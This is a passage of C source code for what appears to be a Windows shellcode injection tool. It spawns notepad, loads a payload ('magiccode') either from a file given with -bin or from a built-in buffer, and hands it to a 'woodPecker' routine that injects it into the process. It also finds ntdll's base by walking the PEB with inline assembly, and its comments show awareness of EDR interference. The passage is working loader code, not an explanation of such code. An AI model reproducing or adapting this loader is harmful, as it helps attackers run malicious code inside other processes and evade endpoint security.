            printf("[*] Notepad started with default settings.\n");
            pid = pi.dwProcessId;
            printf("[+] notepad PID: %lu\n", (unsigned long)pid);
        }
    }


	// printf("[+] Creating process...\n");
    // printf("[*] Press any key to continue...\n");
    // getchar(); 

    // start the woodpecker
    SYSTEM_INFO sys_inf;
    GetSystemInfo(&sys_inf);
    DWORD page_size = sys_inf.dwPageSize ? sys_inf.dwPageSize : 0x1000;
    DWORD alloc_gran = sys_inf.dwAllocationGranularity ? sys_inf.dwAllocationGranularity : 0x10000;
    // DWORD page_size = 0x1000;

    // -bin
    if (binPath) {
        if (!ReadContents(binPath, &magic_code, &allocatedSize)) {
            fprintf(stderr, "[-] Failed to read binary file\n");
        } else {
            printf("\033[32m[+] Read binary file successfully, size: %zu bytes\033[0m\n", allocatedSize);
            // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
        }
    } else {
        magic_code = magiccode; 
        allocatedSize = sizeof(magiccode);
        printf("\033[32m[+] Using default magiccode with size: %zu bytes\033[0m\n", allocatedSize);
        // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
    }

    printf("\033[33m[+] Press any key to start the woodpecker...\033[0m\n");
    getchar();

    int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);


}



ADDR *GetNtdllBase() {

    //1st method: 
    // void *ntdllBase = NULL;
    // PPEB_LDR_DATA ldr = NULL;
    // PPEB pPEB = NULL;

    /// get PEB: 
    // #ifdef _WIN64
    //     pPEB = (PPEB)__readgsqword(0x60); // Read PEB address from the GS segment register
    // #else
    //     pPEB = (PPEB)__readfsdword(0x30); // Read PEB address from the FS segment register
    // #endif

    // #ifdef _WIN64
    //     __asm__ volatile (
    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register, PEB is pointed by a pointer at offset 0x60 to the TEB. 
    //         : "=r" (pPEB)
    //     );
    // #else
    //     __asm__ volatile (
    //         "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
    //         : "=r" (pPEB)
    //     );
    // #endif
    // // Walk PEB: 
    // DWORD64 qwNtdllBase = (DWORD64)pPEB->Ldr & ~(0x10000 - 1); //Align the Ldr addr to 64kb boundary. 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) { // contain valid DOS header? 
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {  //Valid NT header? 
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase); //First valid module is ntdll.dll
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000; //Windows loader aligns DLLs to 64kb boundary to simplify address space layout. 
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    //2nd: 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE && ntHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase);
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000;
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    
    //2nd method: 
    void *ntdllBase = NULL;
    PPEB_LDR_DATA ldr = NULL;
    PPEB pPEB = NULL;
    PLDR_DATA_TABLE_ENTRY_FREE dte = NULL;

    #ifdef _WIN64
        __asm__ volatile (
            "movq %%gs:0x60, %0" // Read PEB address from the GS segment register
            : "=r" (pPEB)
        );
    #else
        __asm__ volatile (
            "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
            : "=r" (pPEB)
        );
    #endif

    // Get PEB_LDR_DATA
    ldr = pPEB->Ldr;

    // // Iterate through InMemoryOrderModuleList to find ntdll.dll
    // LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    // LIST_ENTRY* current = head->Flink;

    // while (current != head) {
    //     dte = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    //     // Print the base address and name of each module
    //     wprintf(L"Module: %ls, Base Address: %p\n", dte->BaseDllName.Buffer, dte->DllBase);

    //     // Check if the BaseDllName matches "ntdll.dll"
    //     if (wcscmp(dte->BaseDllName.Buffer, L"ntdll.dll") == 0) {
    //         ntdllBase = dte->DllBase;
    //         break;
    //     }

    //     current = current->Flink;
    // }

    // Get the 2nd entry in the InMemoryOrderModuleList, but if EDR injects fake DLL, it will not be the 2nd entry.

    // Get the first entry (the application itself)
    LIST_ENTRY* firstEntry = ldr->InMemoryOrderModuleList.Flink;
    // Get the second entry (ntdll.dll)
    LIST_ENTRY* secondEntry = firstEntry->Flink;

    // Get the LDR_DATA_TABLE_ENTRY_FREE for ntdll.dll
    dte = CONTAINING_RECORD(secondEntry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    ntdllBase = dte->DllBase;

    // /// OR check the string name of the module:
    // LIST_ENTRY* current = Ldr->InMemoryOrderModuleList; // Get the first entry in the list of loaded modules
    // do {
    //     current = current->Flink; // Move to the next entry
    //     MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    //     char dllName[256]; // Buffer to store the name of the DLL
    //     snprintf(dllName, sizeof(dllName), "%wZ", entry->FullDllName);
    //     if (strstr(dllName, "ntdll.dll")) { // Check if dllName contains "ntdll.dll"
    //         return entry->DllBase; // Return the base address of ntdll.dll
    //     }
    // } while (current != Ldr->InMemoryOrderModuleList); // Loop until we reach the first entry again


    if (ntdllBase != NULL) {
        printf("\033[32m[+] Ntdll base address found: 0x%p\033[0m\n", ntdllBase);
    } else {
        printf("\033[31m[-] Ntdll base address not found\n\033[0m");
    }

    return (ADDR*)ntdllBase;
}




// -bin 
BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize)
{
    FILE* f = NULL;
    _wfopen_s(&f, Filepath, L"rb");
    if (!f) {
        return FALSE;
    }

    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fileSize <= 0) {
        fclose(f);
        return FALSE;
    }

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(f);
        return FALSE;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, f);
    fclose(f);

    if (bytesRead != fileSize) {
        free(buffer);
        return FALSE;
    }

    *magiccode = buffer;
    *magiccodeSize = (SIZE_T)fileSize;
    return TRUE;
}
